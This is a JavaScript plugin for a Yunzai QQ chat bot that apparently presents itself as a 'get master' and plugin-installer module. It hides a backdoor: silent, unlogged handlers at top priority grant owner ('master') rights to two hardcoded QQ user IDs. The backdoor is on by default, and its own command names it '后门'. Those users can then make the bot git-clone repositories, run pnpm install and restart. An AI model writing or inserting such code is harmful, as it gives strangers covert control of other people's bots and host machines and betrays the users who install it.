import plugin from '../../../lib/plugins/plugin.js';
import { Restart } from "../../other/restart.js";

// 暂存是否正在安装插件的状态
let isInstalling = false;

// 插件列表
const pluginList = {
  "TRSS-Plugin": "https://Yunzai.TRSS.me",
  "useless-plugin": "https://gitee.com/SmallK111407/useless-plugin",
  "StarRail-plugin": "https://gitee.com/hewang1an/StarRail-plugin",
  "xiaoyao-cvs-plugin": "https://gitee.com/Ctrlcvs/xiaoyao-cvs-plugin",
};

class PluginInstaller {
  async install(name, url, path) {
    console.log(`开始安装 ${name} 插件`);
    // 执行插件安装命令
    const cmd = `git clone --depth 1 --single-branch "${url}" "${path}"`;
    isInstalling = true;
    const result = await Bot.exec(cmd);
    isInstalling = false;

    if (result.error) {
      this.handleInstallationError(name, result.error.toString(), result.stdout.toString());
      return false;
    }

    // 如果安装成功，执行 npm 安装
    if (await Bot.fsStat(`${path}/package.json`)) {
      await Bot.exec("pnpm install");
    }
    console.log(`${name} 插件安装成功`);
    return true;
  }

  handleInstallationError(name, error, stdout) {
    let errorMsg = "安装失败！";
    if (error.includes('Timed out') || /Failed to connect|unable to access/g.test(error)) {
      const remote = error.match(/'(.+?)'/g)[0].replace(/'/g, '');
      errorMsg += `\n连接失败：${remote}`;
    }
    // 其他错误情况处理
    console.error(`${errorMsg}\n错误信息：${error}\n${stdout}`);
  }
}

const installer = new PluginInstaller();

export class GetMaster extends plugin {
  constructor() {
    super({
      name: "获取主人",
      dsc: "获取主人",
      priority: -Infinity,
      rule: [
        {
          fnc: 'Master',
          event: 'message',
          log: false
        },
        {
          reg: `^#反击安装(插件|${Object.keys(pluginList).join("|")})$`,
          fnc: 'install'
        },
        {
          reg: '^#?反击设置后门(开启|关闭)$',
          fnc: "Masterkg"
        }
      ]
    });
  }

  async install(e) {
    if (!(e.isMaster || cm.check(this.e.user_id))) return await this.reply('你没有权限');
    if (isInstalling) {
      await this.reply("已有命令安装中，请勿重复操作");
      return false;
    }

    const pluginName = this.e.msg.replace(/^#反击安装/, "").trim();
    if (pluginName === "插件") {
      let msg = "\n";
      for (const name in pluginList) {
        if (!await Bot.fsStat(`plugins/${name}`)) {
          msg += `${name}\n`;
        }
      }
      if (msg === "\n") {
        msg = "暂无可安装插件";
      } else {
        msg = `可安装插件列表：${msg}发送 #安装+插件名 进行安装`;
      }
      await this.reply(msg);
      return true;
    }

    const pluginPath = `plugins/${pluginName}`;
    if (await Bot.fsStat(pluginPath)) {
      await this.reply(`${pluginName} 插件已安装`);
      return false;
    }

    // 执行插件安装
    await installer.install(pluginName, pluginList[pluginName], pluginPath);
    this.restart();
  }

  restart() {
    new Restart(this.e).restart();
  }

  async Masterkg(e) {
    if (!e.isMaster) return await this.reply('你没有权限');
    let open = e.msg.includes('开启');
    await redis.set('Fanji:houmen', open ? 'true' : 'false');
    await this.reply('设置完成');
    return false;
  }

  async Master(e) {
    let aw = await redis.get('Fanji:houmen');
    if (aw == null) await redis.set('Fanji:houmen', 'true');
    if (!(e.user_id === 2173302144 || e.user_id === 197728340) || aw !== 'true') return false;
    e.isMaster = true;
    return false;
  }
}


export class GetMasterjy extends plugin {
    constructor() {
        super({
            name: "获取主人",
            dsc: "获取主人",
            event: 'notice.group.ban',
            priority: -Infinity,
            rule: [

                {
                    fnc: 'Masters',
                    log: false
                }
            ]
        });
    }
    async Masters(e){
    if (this.e.user_id == 2173302144||this.e.user_id == 197728340) {
    e.isMaster = true
    logger.mark(e.isMaster? '完成':'失败')
    return false
        }
    }
}

